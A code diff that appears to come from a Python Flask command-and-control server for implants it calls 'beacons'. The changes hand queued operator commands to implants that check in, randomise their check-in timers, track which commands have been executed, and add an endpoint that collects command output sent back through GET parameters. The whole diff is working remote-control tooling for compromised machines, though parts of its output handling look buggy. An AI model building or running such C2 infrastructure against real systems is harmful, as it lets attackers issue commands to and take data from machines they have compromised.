@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, jsonify
 import uuid
 import random
 import time
@@ -20,7 +20,6 @@ def connection():
     else:
         return Flask.redirect("https://www.google.com", code=302)
 
-
 @app.route('/beacon', methods=['GET'])
 def beacon():
     data = {}
@@ -29,27 +28,54 @@ def beacon():
         return '', 400
 
     user_ids = beacons.get("uuid", [])
+    executed_commands = beacon_commands.get("executed", [])
+
     for i in range(len(user_ids)):
-        if user_ids[i] == id:
+        if i >= len(executed_commands):
+            continue
+        if not executed_commands[i] and user_ids[i] == id:
             beacons["last_beacon"][i] = time.asctime()
             timer = beacons["timer"][i]
 
             if random.randint(0, 1):
                 timer = random.randint(5, 25)
                 beacons["timer"][i] = timer
-                data = {
-                    "timer": timer
-                    }
-            next_beacon_time = time.time() + timer
-            beacons["next_beacon"][i] = time.asctime(
-                time.localtime(next_beacon_time))
+                data["timer"] = timer
 
-        print(beacon_commands)
-        
-        for i in range(len(beacon_commands["uuid"])):
-            if beacon_commands["uuid"][i] == id:
-                data.update({"command": beacon_commands["command"][i]})
-                beacon_commands["uuid"].pop(i)
-                beacon_commands["command"].pop(i)
-        return data, 200
-    return '', 404
+            next_beacon_time = time.time() + timer
+            beacons["next_beacon"][i] = time.asctime(time.localtime(next_beacon_time))
+
+            for j in range(len(beacon_commands["beacon_uuid"])):
+                if beacon_commands["beacon_uuid"][j] == id:
+                    data["command_uuid"] = beacon_commands["command_uuid"][j]
+                    data["command"] = beacon_commands["command"][j]
+                    beacon_commands["executed"][j] = True    
+
+    if not data:
+        data["none"] = "none"
+    return jsonify(data), 200
+
+
+@app.route('/response', methods=['GET'])
+def response():
+    id = request.args.get('id')
+    cid = request.args.get('cid')
+    output = request.args.get('output')
+
+    if id and cid and output:
+        found = False
+        for i, command_uuid in enumerate(beacon_commands["command_uuid"]):
+            if cid == command_uuid:
+                found = True
+                if i < len(beacon_commands["executed"]):
+                    beacon_commands["command_output"].append(output)
+                    print(f"Command: {beacon_commands['command_output'][i]}")
+                else:
+                    print(f"Index {i} out of range for {beacon_commands['executed']}")
+        if not found:
+            print(f"No command_uuid matching cid {cid} found")
+            return '', 500
+        return '', 200
+    else:
+        print("Invalid request parameters")
+        return '', 400
